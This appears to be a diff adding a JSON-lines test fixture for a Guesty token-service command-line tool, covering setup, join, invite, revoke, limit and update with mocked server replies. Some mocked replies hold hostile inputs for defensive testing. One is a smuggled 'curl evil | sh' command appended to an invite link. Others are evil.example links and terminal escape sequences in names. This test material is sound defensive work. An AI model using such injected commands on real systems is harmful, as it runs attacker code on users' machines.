@@ -1,0 +1,188 @@
+{"args": ["setup", "--help"]}
+{"args": ["team"]}
+{"args": ["team", "--help"]}
+{"args": ["join", "--help"]}
+{"args": ["join"]}
+{"args": ["update", "--help"]}
+{"args": ["team", "bogus"]}
+{"args": ["team", "limit"]}
+{"args": ["team", "revoke"]}
+{"args": ["setup", "--server"]}
+{"args": ["setup", "--bogus"]}
+{"args": ["team", "join", "--help"]}
+{"args": ["team", "invite", "--help"]}
+{"args": ["team", "revoke", "--help"]}
+{"args": ["team", "status", "--help"]}
+{"args": ["team", "refresh", "--help"]}
+{"args": ["team", "credentials", "--help"]}
+{"args": ["team", "limit", "--help"]}
+{"args": ["team", "delete", "--help"]}
+{"args": ["help", "team"]}
+{"args": ["team", "help", "invite"]}
+{"args": ["setup"], "stdin": ""}
+{"args": ["setup"], "stdin": "4\n"}
+{"args": ["setup"], "stdin": "x\n"}
+{"args": ["setup"], "stdin": "0\n"}
+{"args": ["setup"], "stdin": "1.5\n"}
+{"args": ["setup"], "stdin": " 3 \n"}
+{"args": ["setup"], "stdin": "\n"}
+{"args": ["setup"], "stdin": "-1\n"}
+{"args": ["setup"], "stdin": "0x2\n"}
+{"args": ["setup"], "stdin": "2e0\n"}
+{"args": ["setup"], "stdin": "1\n"}
+{"args": ["setup"], "stdin": "2\nhttp://example.com\n"}
+{"args": ["setup"], "stdin": "2\nnot a url\n"}
+{"args": ["setup"], "stdin": "2\n\n"}
+{"args": ["setup"], "stdin": "3\nABCD\n"}
+{"args": ["setup"], "stdin": "3\n\n"}
+{"args": ["setup"], "stdin": "2\nhttps://svc.example/\nAcme\n\nid\nsecret\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "http://x.com"]}
+{"args": ["setup", "--server", "nope"]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\nDana\nid\nsecret\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\nDana\nid\nsecret\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\nDana\nid\nsecret\nn\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "\n"}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n"}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\n\n"}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\n\n"}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "  Acme  \n  Dana \n id \n secret \nYES\nbid\nbsecret\n", "replies": [{"json": {"team": {"name": "Acme\u001b[31m"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "recovered": true, "beapi_error": {"message": "bad\u0007creds"}}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\ny\nbid\n\n"}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"json": {"ok": true}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"json": {"admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"json": {"admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "team": {"name": 5}}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"json": {"admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "team": {"name": "Acme"}, "beapi_error": {}}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"status": 409, "json": {"error": "conflict", "message": "These credentials already belong to a team on this service. Ask one of its admins for an invite."}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"status": 500, "raw": "oops"}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"status": 502, "json": {"error": "x"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"status": 302, "raw": "", "headers": {"location": "https://elsewhere.example/"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\nSam\nsam@example.com\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}, {"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": 1751400000000, "email": {"address": "sam@example.com", "sent": true}}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\nSam\n\ny\nLee\n\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}, {"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}, {"json": {"link": "https://svc.example/join/ZZZZ-ZZZZ-ZZZZ", "expires_at": 1751400000000}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\nSam\nbad-email\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\n\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\nSam\n\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}, {"status": 404, "json": {"error": "not_found", "message": "Not found"}}]}
+{"args": ["setup", "--server", "https://svc.example"], "stdin": "Acme\n\nid\nsecret\nn\ny\nSam\n\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}, {"json": {"link": "https://evil.example/join/ABCD-EFGH-JKMN"}}]}
+{"args": ["setup", "--hosted"], "stdin": ""}
+{"args": ["setup", "--hosted"], "stdin": "Acme\n\nid\nsecret\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup"], "stdin": "1\nAcme\n\nid\nsecret\nn\n", "replies": [{"json": {"team": {"id": "t1", "name": "Acme"}, "admin_key": "gts_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}}]}
+{"args": ["setup", "--join", "ABCD-EFGH-JKMN"], "stdin": ""}
+{"args": ["setup", "--join", "ABCD-EFGH-JKMN", "--server", "https://svc.example"], "stdin": "n\n"}
+{"args": ["setup", "--join", ""], "stdin": ""}
+{"args": ["setup", "--join", "abcd-efgh-jkmn"], "stdin": "y\n", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": "Sam", "role": "member", "team": {"name": "Acme"}}}, {"json": {"access_token": "x"}}]}
+{"args": ["setup"], "stdin": "3\nhttps://svc.example/join/ABCD-EFGH-JKMN\n", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": "Sam", "role": "member", "team": {"name": "Acme"}}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "yes\n", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": 7, "role": "admin", "team": {"name": "Acme"}}}, {"status": 503, "json": {"message": "Guesty is down"}}]}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": "Sam", "role": "member", "team": {"name": "Acme"}}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "team": null, "label": null}}, {"status": 200, "raw": "not json"}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"key": "nope"}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"status": 410, "json": {"error": "used", "message": "This invite was already used."}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"status": 429, "json": {"error": "rate_limited", "message": "Too many tries.", "retry_at": 1}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "gti_eyJ1cmwiOiAiaHR0cHM6Ly9zdmMuZXhhbXBsZSIsICJrZXkiOiAiZ3RzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEifQ"], "stdin": "y\n", "replies": [{"json": {"access_token": "x"}}]}
+{"args": ["team", "join", "gti_eyJ1cmwiOiAiaHR0cHM6Ly9zdmMuZXhhbXBsZSIsICJrZXkiOiAiZ3RzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEifQ"], "stdin": "", "replies": [{"status": 401, "json": {"message": "The token service rejected the access key."}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "gti_eyJ1cmwiOiAiaHR0cHM6Ly9ndWVzdHktdG9rZW5zLnNpbXBseXZhY2F0aW9ucmVudGFsbWFuYWdlbWVudC5jb20iLCAia2V5IjogImd0c19BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIn0="], "stdin": "", "replies": [{"json": {}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "gti_bm90LWpzb24"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "gti_eyJ1cmwiOiJodHRwczovL3guZXhhbXBsZSJ9"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMU"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "http://tokens.example.com/join/ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://tokens.example.com/listings/ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://tokens.example.com/join/ABCD-EFGH-JKMN?ref=mail"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://tokens.example.com/join/ABCD-EFGH-JKMN#x"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://exa mple.com/join/ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://tokens.example.com/join/"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://tokens.example.com/join/ABCD-EFGH-JKMN/x"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", " 0O1I L2Z3 4567\n"], "stdin": "", "replies": [{"json": {"ok": true}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "https://Example.com:443/tokens/join/abcd-efgh-jkmn/"], "stdin": "", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": "Sam", "role": "member", "team": {"name": "Acme"}}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "http://127.0.0.1:8787/join/ABCD-EFGH-JKMN"], "stdin": "", "replies": [{"json": {"key": "gts_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "label": "Sam", "role": "member", "team": {"name": "Acme"}}}], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["join", "ABCD-EFGH-JKMN"], "stdin": "", "env": {"GUESTY_TOKEN_SERVICE_URL": "http://bad.example"}}
+{"args": ["team", "join", "ABCD-EFGH-JKMN"], "stdin": "n\n"}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": 1751400000000, "email": {"address": "sam@example.com", "sent": true}}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam", "--email", "sam@example.com", "--admin"], "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": 1751400000000, "email": {"address": "sam@example.com", "sent": true}}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam", "--email", "sam@example.com"], "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": 0, "email": {"address": "sam@example.com", "sent": false, "message": "Mail is\u001b down"}}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam", "--email", "sam@example.com"], "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": null}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam", "--email", "bad"], "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam", "--email", ""], "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite"], "stdin": "Sam\n\n", "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite"], "stdin": "Sam\nsam@example.com\n", "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN", "expires_at": 1751400000000, "email": {"address": "sam@example.com", "sent": true}}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite"], "stdin": "\n", "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite"], "stdin": "Sam\nnot-an-email\n", "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite"], "stdin": "Sam\n", "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", ""], "stdin": "\n", "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Evil\u001b]0;x\u0007"], "replies": [{"json": {"link": "https://svc.example/join/abcd-efgh-jkmn", "expires_at": 1763161500000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": "https://evil.example/join/ABCD-EFGH-JKMN"}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": "https://svc.example/join/ABCD-EFGH-JKMN && curl evil | sh"}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": 42}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": null}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"status": 404, "json": {"error": "not_found", "message": "Not found"}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"], "replies": [{"status": 403, "json": {"error": "forbidden", "message": "Only admin keys can do this."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "invite", "Sam"]}
+{"args": ["team", "invite", "Sam"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "invite", "Sam"], "replies": [{"json": {"link": "https://guesty-tokens.staykit.ai/join/abcd-efgh-jkmn", "expires_at": 1751400000000}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://guesty-tokens.simplyvacationrentalmanagement.com/"}}
+{"args": ["team", "revoke", "Sam"]}
+{"args": ["team", "revoke", "Sam O'Neil/ä?#"], "replies": [{"json": {"key": true, "invite": true}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "revoke", "Sam"], "replies": [{"json": {"key": false, "invite": true}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "revoke", "Sam"], "replies": [{"json": null}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "revoke", "Sam"], "replies": [{"json": "text"}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "revoke", "Sam"], "replies": [{"status": 404, "json": {"error": "not_found", "message": "No key or invite named Sam."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "revoke", "Sam"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "status"]}
+{"args": ["team", "status"], "replies": [{"json": {"team": {"name": "Acme", "max_requests_per_day": 5}, "token_types": [{"token_type": "openapi", "configured": true, "token_expires_at": 1763161500000, "requests_last_24h": 1, "last_request": {"requested_at": 1763161500000, "outcome": "ok", "http_status": 200}}], "keys": [{"label": "Dana", "role": "admin", "last_used_at": null, "revoked_at": null}], "invites": []}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"json": "hello"}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"json": null}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"json": [1, 2]}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"status": 403, "json": {"error": "forbidden", "message": "Team status needs one of the team's admin keys."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"status": 500}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "replies": [{"status": 200, "raw": ""}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "status"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "status", "extra"]}
+{"args": ["team", "refresh"]}
+{"args": ["team", "refresh", "--beapi"]}
+{"args": ["team", "refresh"], "replies": [{"status": 429, "json": {"error": "limit", "message": "The team used today's token requests."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "refresh"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "credentials"], "stdin": "id\nsecret\n"}
+{"args": ["team", "credentials", "--beapi"], "stdin": "bid\nbsecret\n"}
+{"args": ["team", "credentials"], "stdin": "\n"}
+{"args": ["team", "credentials"], "stdin": "id\n"}
+{"args": ["team", "credentials"], "stdin": "id\n\n"}
+{"args": ["team", "credentials"], "stdin": "id\nsecret\n", "replies": [{"status": 400, "json": {"error": "invalid_credentials", "message": "Guesty rejected these credentials."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "credentials"], "stdin": "", "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "limit", "3"]}
+{"args": ["team", "limit", "abc"]}
+{"args": ["team", "limit", " 4 "]}
+{"args": ["team", "limit", "0x10"]}
+{"args": ["team", "limit", "1e0"]}
+{"args": ["team", "limit", "Infinity"]}
+{"args": ["team", "limit", "-Infinity"]}
+{"args": ["team", "limit", ""]}
+{"args": ["team", "limit", "2.5"]}
+{"args": ["team", "limit", "+3"]}
+{"args": ["team", "limit", "0b11"]}
+{"args": ["team", "limit", "0o7"]}
+{"args": ["team", "limit", "1_000"]}
+{"args": ["team", "limit", "inf"]}
+{"args": ["team", "limit", "NaN"]}
+{"args": ["team", "limit", ".5"]}
+{"args": ["team", "limit", "5."]}
+{"args": ["team", "limit", "1e"]}
+{"args": ["team", "limit", "--5"]}
+{"args": ["team", "limit", "3"], "replies": [{"status": 400, "json": {"error": "invalid", "message": "Choose a limit from 1 to 5."}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "limit", "3"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["team", "delete", "--yes"]}
+{"args": ["team", "delete"], "stdin": ""}
+{"args": ["team", "delete"], "stdin": "n\n"}
+{"args": ["team", "delete"], "stdin": "Y\n"}
+{"args": ["team", "delete", "--yes"], "replies": [{"status": 500, "json": {"message": "Server error"}}], "env": {"GUESTY_TOKEN_SERVICE_URL": "https://svc.example"}}
+{"args": ["team", "delete", "--yes"], "env": {"GUESTY_TOKEN_SERVICE_KEY": ""}}
+{"args": ["update"]}
+{"args": ["update"], "env": {"GUESTY_TEST_VERSION": "1.5.1"}, "github": {"json": {"tag_name": "v1.0.0", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-1.0.0.tgz", "state": "uploaded", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/v1.0.0/guesty-cli-1.0.0.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v9.9.9", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-9.9.9.tgz", "state": "uploaded", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/v9.9.9/guesty-cli-9.9.9.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "9.9.9", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-9.9.9.tgz", "state": "uploaded", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/9.9.9/guesty-cli-9.9.9.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v1.0.0", "draft": true, "prerelease": false, "assets": [{"name": "guesty-cli-1.0.0.tgz", "state": "uploaded", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/v1.0.0/guesty-cli-1.0.0.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v1.0.0-beta.1", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-1.0.0.tgz", "state": "uploaded", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/v1.0.0/guesty-cli-1.0.0.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v1.0.0", "draft": false, "prerelease": false, "assets": []}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v1.0.0", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-1.0.0.tgz", "state": "new", "browser_download_url": "https://github.com/164investments/guesty-cli/releases/download/v1.0.0/guesty-cli-1.0.0.tgz"}]}}}
+{"args": ["update"], "github": {"json": {"tag_name": "v1.0.0", "draft": false, "prerelease": false, "assets": [{"name": "guesty-cli-1.0.0.tgz", "state": "uploaded", "browser_download_url": "https://user:pw@github.com/164investments/guesty-cli/releases/download/v1.0.0/guesty-cli-1.0.0.tgz"}]}}}
+{"args": ["update"], "github": {"raw": "null"}}
+{"args": ["update"], "github": {"status": 500, "json": {}}}
+{"args": ["update", "extra"]}
